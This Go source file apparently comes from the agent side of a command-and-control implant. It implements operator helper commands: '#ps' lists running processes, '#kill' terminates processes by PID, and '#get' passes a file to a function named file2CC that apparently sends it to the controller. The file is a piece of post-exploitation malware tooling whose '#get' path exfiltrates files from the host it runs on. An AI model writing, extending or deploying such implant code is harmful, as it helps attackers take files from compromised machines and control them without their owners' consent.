package agent

import (
	"fmt"
	"os"
	"strconv"

	gops "github.com/mitchellh/go-ps"
)

// shellHelper ps and kill and other helpers
func shellHelper(cmdSlice []string) (out string) {
	cmd := cmdSlice[0]
	args := cmdSlice[1:]
	var err error

	switch cmd {
	case "#ps":
		out, err = shellPs()
		if err != nil {
			out = fmt.Sprintf("Failed to ps: %v", err)
		}
	case "#kill":
		out, err = shellKill(args)
		if err != nil {
			out = fmt.Sprintf("Failed to kill: %v", err)
		}
	case "#get":
		filepath := args[0]
		checksum, err := file2CC(filepath)
		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
		if err != nil {
			out = filepath + err.Error()
		}
	default:
		out = "Unknown helper"
	}

	return
}

func shellKill(args []string) (out string, err error) {
	var (
		pid  int
		proc *os.Process
	)
	for _, pidStr := range args {
		pid, err = strconv.Atoi(pidStr)
		if err != nil {
			return
		}
		proc, err = os.FindProcess(pid)
		if err != nil {
			return
		}

		// kill process
		err = proc.Kill()
		if err != nil {
			out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
			return
		}
		out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
	}
	return
}

func shellPs() (out string, err error) {
	procs, err := gops.Processes()
	if err != nil {
		return
	}

	for _, proc := range procs {
		out = fmt.Sprintf("%s\n%d<-%d    %s", out, proc.Pid(), proc.PPid(), proc.Executable())
	}
	return
}
